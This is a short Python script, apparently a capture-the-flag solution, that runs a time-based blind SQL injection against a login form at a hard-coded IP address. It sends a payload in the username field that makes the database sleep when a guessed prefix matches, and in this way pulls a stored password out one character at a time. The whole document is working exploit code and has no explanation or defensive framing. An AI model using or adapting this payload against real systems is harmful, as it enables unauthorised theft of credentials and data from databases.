#!/usr/local/bin/python3

import requests
from time import time

url = "http://54.254.115.115:5002"

chars = "abcdefghijklmnopqrstuvwzyxABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890+/="

seen_chars = list()
while True:
  for c in chars:
    print(f"try: {c}")
    start = time()
    r = requests.post(url, data = {
      "username": 'flag2" AND BINARY password LIKE "' + "".join(seen_chars) + c + '%" AND SLEEP(2) # '}
    )
    stop = time()
    diff = stop - start
    if diff > 2:
      seen_chars.append(c)
      print("".join(seen_chars))
      break

